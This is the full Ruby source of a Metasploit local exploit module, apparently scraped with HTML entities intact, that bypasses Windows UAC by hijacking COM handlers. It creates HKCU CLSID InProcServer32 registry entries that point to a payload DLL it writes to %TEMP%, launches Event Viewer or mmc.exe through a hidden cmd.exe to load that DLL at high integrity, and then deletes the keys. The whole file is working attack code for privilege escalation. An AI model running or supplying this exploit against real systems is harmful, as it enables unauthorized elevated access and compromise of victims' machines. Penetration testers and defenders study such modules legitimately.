# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Post::Windows::Priv
  include Post::Windows::Registry
  include Post::Windows::Runas
  include Exploit::FileDropper

  CLSID_PATH       = "HKCU\\Software\\Classes\\CLSID"
  DEFAULT_VAL_NAME = &#039;&#039; # This maps to "(Default)"

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)&#039;,
      &#039;Description&#039;   => %q{
        This module will bypass Windows UAC by creating COM handler registry entries in the
        HKCU hive. When certain high integrity processes are loaded, these registry entries
        are referenced resulting in the process loading user-controlled DLLs. These DLLs
        contain the payloads that result in elevated sessions. Registry key modifications
        are cleaned up after payload invocation.

        This module requires the architecture of the payload to match the OS, but the
        specifying EXE::Custom your DLL should call ExitProcess() after starting your
        payload in a separate process.

        This module invokes the target binary via cmd.exe on the target. Therefore if
        cmd.exe access is restricted, this module will not run correctly.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
          &#039;Matt Nelson&#039;,    # UAC bypass discovery and research
          &#039;b33f&#039;,           # UAC bypass discovery and research
          &#039;OJ Reeves&#039;       # MSF module
        ],
      &#039;Platform&#039;      => [&#039;win&#039;],
      &#039;Targets&#039;       => [
          [&#039;Automatic&#039;, {}]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;References&#039;    => [
        [
          &#039;URL&#039;, &#039;https://www.youtube.com/watch?v=3gz1QmiHhss&#039;,
          &#039;URL&#039;, &#039;https://wikileaks.org/ciav7p1/cms/page_13763373.html&#039;,
          &#039;URL&#039;, &#039;https://github.com/FuzzySecurity/Defcon25/Defcon25_UAC-0day-All-Day_v1.2.pdf&#039;,
        ]
      ],
      &#039;DisclosureDate&#039;=> &#039;Jan 01 1900&#039;
    ))
  end

  def check
    if sysinfo[&#039;OS&#039;] =~ /Windows (7|8|10|2008|2012|2016)/ && is_uac_enabled?
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    # Make sure we have a sane payload configuration
    if sysinfo[&#039;Architecture&#039;] != payload_instance.arch.first
      fail_with(Failure::BadConfig, "#{payload_instance.arch.first} payload selected for #{sysinfo[&#039;Architecture&#039;]} system")
    end

    registry_view = REGISTRY_VIEW_NATIVE
    if sysinfo[&#039;Architecture&#039;] == ARCH_X64 && session.arch == ARCH_X86
      registry_view = REGISTRY_VIEW_64_BIT
    end

    # Validate that we can actually do things before we bother
    # doing any more work
    check_permissions!

    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        fail_with(Failure::NotVulnerable,
                  "UAC is set to &#039;Always Notify&#039;. This module does not bypass this setting, exiting..."
        )
      when UAC_DEFAULT
        print_good(&#039;UAC is set to Default&#039;)
        print_good(&#039;BypassUAC can bypass this setting, continuing...&#039;)
      when UAC_NO_PROMPT
        print_warning(&#039;UAC set to DoNotPrompt - using ShellExecute "runas" method instead&#039;)
        shell_execute_exe
        return
    end

    payload = generate_payload_dll({:dll_exitprocess => true})
    commspec = expand_path(&#039;%COMSPEC%&#039;)
    dll_name = expand_path("%TEMP%\\#{rand_text_alpha(8)}.dll")
    hijack = hijack_com(registry_view, dll_name)

    unless hijack && hijack[:cmd_path]
      fail_with(Failure::Unknown, &#039;Unable to hijack COM&#039;)
    end

    begin
      print_status("Targeting #{hijack[:name]} via #{hijack[:root_key]} ...")
      print_status("Uploading payload to #{dll_name} ...")
      write_file(dll_name, payload)
      register_file_for_cleanup(dll_name)

      print_status("Executing high integrity process ...")
      args = "/c #{expand_path(hijack[:cmd_path])}"
      args << " #{hijack[:cmd_args]}" if hijack[:cmd_args]

      # Launch the application from cmd.exe instead of directly so that we can
      # avoid the dreaded 740 error (elevation requried)
      client.sys.process.execute(commspec, args, {&#039;Hidden&#039; => true})

      # Wait a copule of seconds to give the payload a chance to fire before cleaning up
      Rex::sleep(5)

      handler(client)

    ensure
      print_status("Cleaining up registry ...")
      registry_deletekey(hijack[:root_key], registry_view)
    end
  end

  # TODO: Add more hijack points when they&#039;re known.
  # TODO: when more class IDs are found for individual hijackpoints
  # they can be added to the array of class IDs.
  @@hijack_points = [
    {
      name: &#039;Event Viewer&#039;,
      cmd_path: &#039;%WINDIR%\System32\eventvwr.exe&#039;,
      class_ids: [&#039;0A29FF9E-7F9C-4437-8B11-F424491E3931&#039;]
    },
    {
      name: &#039;Computer Managment&#039;,
      cmd_path: &#039;%WINDIR%\System32\mmc.exe&#039;,
      cmd_args: &#039;CompMgmt.msc&#039;,
      class_ids: [&#039;0A29FF9E-7F9C-4437-8B11-F424491E3931&#039;]
    }
  ]

  #
  # Perform the hijacking of COM class IDS. This function chooses a random
  # application target and a random class id associated with it before
  # modifying the registry.
  #
  def hijack_com(registry_view, dll_path)
    target = @@hijack_points.sample
    target_clsid = target[:class_ids].sample
    root_key = "#{CLSID_PATH}\\{#{target_clsid}}"
    inproc_key = "#{root_key}\\InProcServer32"
    shell_key = "#{root_key}\\ShellFolder"

    registry_createkey(root_key, registry_view)
    registry_createkey(inproc_key, registry_view)
    registry_createkey(shell_key, registry_view)

    registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, &#039;REG_SZ&#039;, registry_view)
    registry_setvaldata(inproc_key, &#039;ThreadingModel&#039;, &#039;Apartment&#039;, &#039;REG_SZ&#039;, registry_view)
    registry_setvaldata(inproc_key, &#039;LoadWithoutCOM&#039;, &#039;&#039;, &#039;REG_SZ&#039;, registry_view)
    registry_setvaldata(shell_key, &#039;HideOnDesktop&#039;, &#039;&#039;, &#039;REG_SZ&#039;, registry_view)
    registry_setvaldata(shell_key, &#039;Attributes&#039;, 0xf090013d, &#039;REG_DWORD&#039;, registry_view)

    {
      name:     target[:name],
      cmd_path: target[:cmd_path],
      cmd_args: target[:cmd_args],
      root_key: root_key
    }
  end

  def check_permissions!
    fail_with(Failure::None, &#039;Already in elevated state&#039;) if is_admin? || is_system?

    # Check if you are an admin
    vprint_status(&#039;Checking admin status...&#039;)
    admin_group = is_in_admin_group?

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end

    unless is_in_admin_group?
      fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
    end

    print_status(&#039;UAC is Enabled, checking level...&#039;)
    if admin_group.nil?
      print_error(&#039;Either whoami is not there or failed to execute&#039;)
      print_error(&#039;Continuing under assumption you already checked...&#039;)
    else
      if admin_group
        print_good(&#039;Part of Administrators group! Continuing...&#039;)
      else
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, &#039;Cannot BypassUAC from Low Integrity Level&#039;)
    end
  end
end

